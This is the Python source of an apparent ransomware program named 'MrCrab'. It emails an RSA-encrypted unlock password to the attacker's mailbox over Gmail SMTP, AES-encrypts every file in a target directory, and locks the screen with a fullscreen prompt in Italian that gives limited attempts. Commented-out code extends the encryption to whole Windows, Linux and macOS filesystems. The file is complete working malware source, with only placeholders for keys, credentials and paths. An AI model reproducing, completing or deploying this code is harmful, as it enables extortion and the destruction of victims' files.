import os 
import smtplib
import random
from tkinter import *
from PIL import Image, ImageTk
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

cont = 2 
password = ""
check = False
key = get_random_bytes(16)  
IV = get_random_bytes(16)  

#   import platform
#   system = platform.system()

#   if system == "Windows": 
#   
#       for root, dirs, files in os.walk("C:\\"):
#   
#           if "Windows" not in root and "Program Files" not in root and "Users" not in root:
#   
#               for file in files:
#   
#                   if file == "mrkrab.py" or file == "bg.png":
#                       continue
#                   
#                   file_path = os.path.join(root, file)
#   
#                   if os.path.isfile(file_path):
#                       files.append(file_path)

#   if system == "Linux": 
#   
#       for root, dirs, files in os.walk("/"):
#   
#           if all(x not in root for x in ["/bin", "/sbin", "/usr", "/etc", "/lib", "/var", "/tmp"]):
#   
#               for file in files:
#      
#                   if file == "mrkrab.py" or file == "bg.png":
#                       continue
#                   
#                   file_path = os.path.join(root, file)
#      
#                   if os.path.isfile(file_path):
#                       files.append(file_path)

#   if system == "Darwin":
#   
#       for root, dirs, files in os.walk("/"):
#   
#           if all(x not in root for x in ["/System", "/Library", "/Network", "/usr"]):
#   
#               for file in files:
#   
#                   for file in files:
#         
#                      if file == "mrkrab.py" or file == "bg.png":
#                           continue
#                      
#                      file_path = os.path.join(root, file)
#         
#                      if os.path.isfile(file_path):
#                          files.append(file_path)


#------------------------------------------------------------------------------------------------------------------------------------------------#

def gen():

    global password

    letters = 'abcdefghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVXYZ0123456789()[]\{\}'
    word = ''

    for i in range(16):

        word += random.choice(letters)

    password = word

    return word.encode()

def mes():

    #################################################################################

    public_key = '''-----BEGIN PUBLIC KEY-----
                    Your RSA publick key here
                    -----END PUBLIC KEY-----'''

    public_key = RSA.import_key(public_key)

    cipher_rsa = PKCS1_OAEP.new(public_key)

    #################################################################################

    email = "email@gmail.com"
    pwd = "email's password"

    subject = "Encrypted message"

    text = gen()

    enc_text = cipher_rsa.encrypt(text)

    message = f"Subject: {subject}\n\n{enc_text.hex()}"

    server = smtplib.SMTP("smtp.gmail.com", 587)

    server.starttls()

    server.login(email, pwd)

    server.sendmail(email, email, message)

    server.quit()

def enc(key, IV):

    files = []

    cipher = AES.new(key, AES.MODE_CBC, IV)

    directory = "/your_directory"

    for file in os.listdir(directory):

        if file == "mrkrab.py" or file == "bg.png":
            continue

        file_path = os.path.join(directory, file)

        if os.path.isfile(file_path):
            files.append(file_path)

    for file in files:
        
        with open(file, "rb") as FileRead:
            contents = FileRead.read()

        contents = pad(contents, 16)

        contents_enc = cipher.encrypt(contents)

        with open(file, "wb") as FileWrite:
            FileWrite.write(contents_enc)

def dec(key, IV):

    files = []

    cipher = AES.new(key, AES.MODE_CBC, IV)
    
    directory = "/your_directory"

    for file in os.listdir(directory):

        if file == "mrkrab.py" or file == "bg.png":
            continue

        file_path = os.path.join(directory, file)

        if os.path.isfile(file_path):
            files.append(file_path)

    for file in files:
        
        with open(file, "rb") as FileRead:
            contents = FileRead.read()

        contents_dec = cipher.decrypt(contents)

        contents_dec = unpad(contents_dec, 16)

        with open(file, "wb") as FileWrite:

            FileWrite.write(contents_dec)       

#------------------------------------------------------------------------------------------------------------------------------------------------#

if __name__ == "__main__":

    mes()

    enc(key, IV) 

    window = Tk() 

    window.title("MrCrab.exe")

    window.attributes("-fullscreen", True)

    image = Image.open("/image/directory")
    photo = ImageTk.PhotoImage(image)

    bg = Canvas(window)
    bg.place(relwidth = 1, relheight = 1)
    bg.create_image(0, 0, image = photo, anchor = "nw")

    input = Entry(bg, font = ('TimesNewRoman', 30))
    input.place(relwidth = 0.275, relheight = 0.05, relx = 0.692, rely = 0.77)

    label = Label(window, text = "Hai ancora 3 tentativi", font = ('TimesNewRoman', 25, "bold"), bg = "orange", fg = "white")
    label.place(relwidth = 0.275, relheight = 0.05, relx = 0.692, rely = 0.88)

    def controllo(event = None):
        
        global password
        global cont
        global check

        if check == False:

            if input.get() == password and input.get() != "" and cont >= 0:
                
                dec(key, IV)
                label.config(text = "Chiave corretta", bg = "green")
                check = True

            elif input.get() != "" and cont - 1 >= 0:

                cont -= 1

                if cont == 0:
                    label.config(text = "Hai ancora " + str(cont + 1) + " tentativo")

                else:
                    label.config(text = "Hai ancora " + str(cont + 1) + " tentativi")
                

            elif input.get() != "":

                label.config(text = "Hai finito i tentativi", bg = "red")
                check = True

        input.delete(0, "end")

    window.bind("<Return>", controllo)

    window.mainloop()